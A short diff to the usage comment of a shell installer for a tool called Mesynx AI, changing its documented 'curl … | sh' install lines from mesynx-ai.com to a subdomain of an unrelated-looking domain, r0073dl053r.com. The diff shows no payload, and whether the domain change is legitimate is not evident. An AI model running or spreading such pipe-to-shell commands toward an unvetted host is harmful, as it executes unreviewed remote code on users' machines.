@@ -2,8 +2,8 @@
 # Mesynx AI one-line installer.
 #
 # Usage:
-#   curl -fsSL https://mesynx-ai.com/install.sh | sh
-#   curl -fsSL https://mesynx-ai.com/v0.2.0/install.sh | sh   # version-pinned
+#   curl -fsSL https://mesynx.r0073dl053r.com/install.sh | sh
+#   curl -fsSL https://mesynx.r0073dl053r.com/v0.2.0/install.sh | sh   # version-pinned
 #
 # What this does:
 #   1. Verifies Docker + docker compose v2 are installed and running.
